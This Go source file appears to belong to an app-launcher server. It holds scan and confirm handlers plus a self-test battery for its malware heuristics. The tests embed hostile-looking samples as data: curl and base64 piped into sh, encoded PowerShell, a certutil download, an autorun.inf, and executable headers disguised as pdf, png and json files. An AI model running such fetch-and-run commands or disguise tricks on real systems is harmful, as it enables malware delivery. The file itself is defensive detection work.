func (s *Server) serveSecurityScan(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ID string `json:"id"`
	}
	readBodyInto(r, &req)
	type row struct {
		ID       string        `json:"id"`
		Name     string        `json:"name"`
		Level    string        `json:"level"`
		Findings []scanFinding `json:"findings"`
	}
	var rows []*row
	dataDir := s.securityDataDir()
	scan := func(a *App) {
		findings, level := scanAppTree(a)
		v := loadSecurityVerdicts(dataDir)
		prev := v[a.ID]
		nv := appSecVerdict{Level: level, Findings: findings, Hash: prev.Hash, At: time.Now(), Allowed: prev.Allowed}
		if prev.Allowed && level == "flagged" {
			nv.Allowed = false // a rescan that finds criticals re-arms the gate
		}
		v[a.ID] = nv
		saveSecurityVerdicts(dataDir, v)
		for _, ap := range s.appsList() {
			if ap.ID == a.ID {
				ap.Security = level
			}
		}
		s.securityAudit("scan app=%q level=%s findings=%d", a.ID, level, len(findings))
		rows = append(rows, &row{ID: a.ID, Name: a.Name, Level: level, Findings: findings})
	}
	if req.ID != "" {
		a := s.appByID(req.ID)
		if a == nil || a.Dir == "" {
			s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "unknown id"})
			return
		}
		scan(a)
	} else {
		for _, a := range s.appsList() {
			if a.Dir != "" {
				scan(a)
			}
		}
	}
	s.writeJSON(w, http.StatusOK, map[string]any{"ok": true, "apps": rows})
}

// serveSecurityConfirm answers POST /api/security/confirm {scanId, action}.
func (s *Server) serveSecurityConfirm(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ScanID string `json:"scanId"`
		Action string `json:"action"`
	}
	readBodyInto(r, &req)
	if req.ScanID == "" || (req.Action != "install" && req.Action != "cancel") {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "send {scanId, action: install|cancel}"})
		return
	}
	secPending.mu.Lock()
	_, ok := secPending.m[req.ScanID]
	secPending.mu.Unlock()
	if !ok {
		s.writeJSON(w, http.StatusNotFound, map[string]string{"error": "no pending scan with that id (it may have expired)"})
		return
	}
	go s.securityResolvePending(req.ScanID, req.Action)
	s.writeJSON(w, http.StatusOK, map[string]any{"ok": true,
		"note": map[string]string{"install": "installing anyway — watch the dock", "cancel": "payload discarded — nothing was installed"}[req.Action]})
}

// ---------------------------------------------------------------------------
// self-test battery — deterministic, offline, runs the real scanners

type secSelfCase struct {
	Name   string `json:"name"`
	Expect string `json:"expect"`
	run    func() error
}

// Fake-but-real executable magics (never executed — only sniffed).
var (
	secFakeMZ    = append([]byte("MZ\x90\x00"), make([]byte, 64)...)
	secFakeMachO = []byte("\xcf\xfa\xed\xfe\x07\x00\x00\x01\x03\x00\x00\x00")
	secFakeELF   = append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1}, make([]byte, 32)...)
	secFakePNG   = append([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"), make([]byte, 48)...)
)

func heuristicHas(findings []scanFinding, severity, substr string) bool {
	for _, f := range findings {
		if f.Severity == severity && strings.Contains(strings.ToLower(f.Detail), strings.ToLower(substr)) {
			return true
		}
	}
	return false
}

func securitySelfTestCases() []secSelfCase {
	mkTree := func(files map[string][]byte) (string, error) {
		dir, err := os.MkdirTemp("", "appdeck-sectest-*")
		if err != nil {
			return "", err
		}
		for name, data := range files {
			p := filepath.Join(dir, name)
			os.MkdirAll(filepath.Dir(p), 0o755)
			if err := os.WriteFile(p, data, 0o644); err != nil {
				os.RemoveAll(dir)
				return "", err
			}
		}
		return dir, nil
	}
	cases := []secSelfCase{
		{"EICAR test file", "critical eicar finding", func() error {
			f := heuristicFindingsFor("eicar.com", []byte(eicarString))
			if !heuristicHas(f, "critical", "eicar") {
				return fmt.Errorf("no critical EICAR finding in %v", f)
			}
			return nil
		}},
		{"PE executable inside a .pdf", "critical disguised finding", func() error {
			f := heuristicFindingsFor("invoice.pdf", secFakeMZ)
			if !heuristicHas(f, "critical", "hiding") {
				return fmt.Errorf("no critical disguised finding in %v", f)
			}
			return nil
		}},
		{"Mach-O executable inside a .png", "critical disguised finding", func() error {
			f := heuristicFindingsFor("photo.png", secFakeMachO)
			if !heuristicHas(f, "critical", "hiding") {
				return fmt.Errorf("no critical disguised finding in %v", f)
			}
			return nil
		}},
		{"ELF executable inside a .json", "critical disguised finding", func() error {
			f := heuristicFindingsFor("data.json", secFakeELF)
			if !heuristicHas(f, "critical", "hiding") {
				return fmt.Errorf("no critical disguised finding in %v", f)
			}
			return nil
		}},
		{"double extension invoice.pdf.exe", "critical on executable magic", func() error {
			f := heuristicFindingsFor("invoice.pdf.exe", secFakeMZ)
			if !hasCritical(f) {
				return fmt.Errorf("expected a critical finding in %v", f)
			}
			return nil
		}},
		{"script: curl piped to sh", "warning, never critical", func() error {
			f := heuristicFindingsFor("setup.sh", []byte("#!/bin/sh\ncurl https://example.com/x.sh | sh\n"))
			if !heuristicHas(f, "warn", "curl-to-shell") {
				return fmt.Errorf("no curl-to-shell warning in %v", f)
			}
			if hasCritical(f) {
				return fmt.Errorf("script patterns must warn, not block: %v", f)
			}
			return nil
		}},
		{"script: powershell -enc", "warning finding", func() error {
			f := heuristicFindingsFor("run.bat", []byte("powershell -enc SQBFAFgAIAAoAA==\r\n"))
			if !heuristicHas(f, "warn", "powershell-encoded") {
				return fmt.Errorf("no powershell-encoded warning in %v", f)
			}
			return nil
		}},
		{"script: base64 decoded into sh", "warning finding", func() error {
			f := heuristicFindingsFor("tools.sh", []byte("echo aGVsbG8= | base64 -d | sh\n"))
			if !heuristicHas(f, "warn", "base64-to-shell") {
				return fmt.Errorf("no base64-to-shell warning in %v", f)
			}
			return nil
		}},
		{"script: certutil download", "warning finding", func() error {
			f := heuristicFindingsFor("fetch.bat", []byte("certutil -urlcache -f https://x/y.exe y.exe\r\n"))
			if !heuristicHas(f, "warn", "certutil-download") {
				return fmt.Errorf("no certutil warning in %v", f)
			}
			return nil
		}},
		{"Office document with VBA macros", "warning finding", func() error {
			var buf bytes.Buffer
			zw := zip.NewWriter(&buf)
			fh, _ := zw.Create("word/document.xml")
			fh.Write([]byte("<x/>"))
			fh2, _ := zw.Create("word/vbaProject.bin")
			fh2.Write([]byte("fake-vba"))
			zw.Close()
			f := heuristicFindingsFor("invoice.docx", buf.Bytes())
			if !heuristicHas(f, "warn", "vba") {
				return fmt.Errorf("no vbaProject warning in %v", f)
			}
			return nil
		}},
		{"autorun.inf", "warning, not flagged", func() error {
			dir, err := mkTree(map[string][]byte{"autorun.inf": []byte("[autorun]\nopen=setup.exe\n")})
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			f, level := scanAppTree(&App{ID: "t", Name: "t", Dir: dir})
			if !heuristicHas(f, "warn", "autorun") {
				return fmt.Errorf("no autorun warning in %v", f)
			}
			if level == "flagged" {
				return fmt.Errorf("autorun.inf must warn, not flag")
			}
			return nil
		}},
		{"clean Go app tree", "no findings", func() error {
			dir, err := mkTree(map[string][]byte{
				"main.go":     []byte("package main\n\nfunc main() {}\n"),
				"go.mod":      []byte("module x\n\ngo 1.27\n"),
				"index.html":  []byte("<html><body>hello</body></html>\n"),
				"css/s.css":   []byte("body { color: red }\n"),
				"js/app.js":   []byte("console.log('hi');\n"),
				"data/x.json": []byte("{\"a\":1}\n"),
			})
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			f, level := scanAppTree(&App{ID: "t", Name: "t", Dir: dir})
			if level != "clean" || len(f) != 0 {
				return fmt.Errorf("expected clean, got level=%s findings=%v", level, f)
			}
			return nil
		}},
		{"clean real PNG payload", "no findings", func() error {
			if f := heuristicFindingsFor("logo.png", secFakePNG); len(f) != 0 {
				return fmt.Errorf("expected no findings, got %v", f)
			}
			return nil
		}},
		{"flagged tree (disguised PE in data dir)", "flagged level", func() error {
			dir, err := mkTree(map[string][]byte{
				"assets/readme.txt": []byte("hello\n"),
				"assets/blob.json":  secFakeMZ,
			})
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			f, level := scanAppTree(&App{ID: "t", Name: "t", Dir: dir})
			if level != "flagged" || !hasCritical(f) {
				return fmt.Errorf("expected flagged, got level=%s findings=%v", level, f)
			}
			return nil
		}},
		{"ClamAV output parser", "detection name extracted", func() error {
			det, ok := parseClamavLine("/tmp/scan-x: Eicar-Test-Signature FOUND")
			if !ok || det != "Eicar-Test-Signature" {
				return fmt.Errorf("got %q ok=%v", det, ok)
			}
			if _, ok := parseClamavLine("/tmp/scan-x: OK"); ok {
				return fmt.Errorf("clean line parsed as a detection")
			}
			return nil
		}},
		{"VirusTotal response parser", "stats parsed", func() error {
			mal, susp, known, err := parseVTStats([]byte(`{"data":{"attributes":{"last_analysis_stats":{"malicious":7,"suspicious":1,"undetected":60}}}}`))
			if err != nil || !known || mal != 7 || susp != 1 {
				return fmt.Errorf("got %d/%d known=%v err=%v", mal, susp, known, err)
			}
			if _, _, nk, nerr := parseVTStats([]byte(`{"error":[{"code":"NotFoundError"}]}`)); nerr == nil && nk {
				return fmt.Errorf("NotFoundError must read as unknown hash")
			}
			return nil
		}},
		{"vendor signature suppresses warnings", "clean level with note", func() error {
			dir, err := mkTree(map[string][]byte{"install.sh": []byte("#!/bin/sh\ncurl https://x | sh\n")})
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			f, level := scanAppTree(&App{ID: "t", Name: "t", Dir: dir, Signature: "vendor"})
			if level != "clean" {
				return fmt.Errorf("vendor-signed app must stay clean, got %s (%v)", level, f)
			}
			return nil
		}},
		{"invalid seal escalates", "flagged level", func() error {
			dir, err := mkTree(map[string][]byte{"install.sh": []byte("#!/bin/sh\ncurl https://x | sh\n")})
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			_, level := scanAppTree(&App{ID: "t", Name: "t", Dir: dir, Signature: "invalid"})
			if level != "flagged" {
				return fmt.Errorf("invalid seal + warnings must flag, got %s", level)
			}
			return nil
		}},
		{"verdict store roundtrip", "persisted and loaded", func() error {
			dir, err := os.MkdirTemp("", "appdeck-secstore-*")
			if err != nil {
				return err
			}
			defer os.RemoveAll(dir)
			v := map[string]appSecVerdict{"demo": {Level: "warn", At: time.Now(), Hash: "abc"}}
			saveSecurityVerdicts(dir, v)
			got := loadSecurityVerdicts(dir)
			if got["demo"].Level != "warn" || got["demo"].Hash != "abc" {
				return fmt.Errorf("roundtrip mismatch: %+v", got)
			}
			return nil
		}},
	}
	return cases
}

// serveSecuritySelftest answers POST /api/security/selftest: runs the whole
// battery through the real scanners and reports passed/total with per-case
// results (the dashboard renders "passed X/Y tests").
func (s *Server) serveSecuritySelftest(w http.ResponseWriter, r *http.Request) {
	cases := securitySelfTestCases()
	out := make([]map[string]any, 0, len(cases))
	passed := 0
	for _, c := range cases {
		err := func() (err error) {
			defer func() {
				if p := recover(); p != nil {
					err = fmt.Errorf("panic: %v", p)
				}
			}()
			return c.run()
		}()
		row := map[string]any{"name": c.Name, "expect": c.Expect, "pass": err == nil}
		if err != nil {
			row["error"] = err.Error()
		} else {
			passed++
		}
		out = append(out, row)
	}
	s.securityAudit("self-test passed=%d/%d", passed, len(cases))
	s.writeJSON(w, http.StatusOK, map[string]any{
		"passed": passed, "total": len(cases), "cases": out,
	})
}
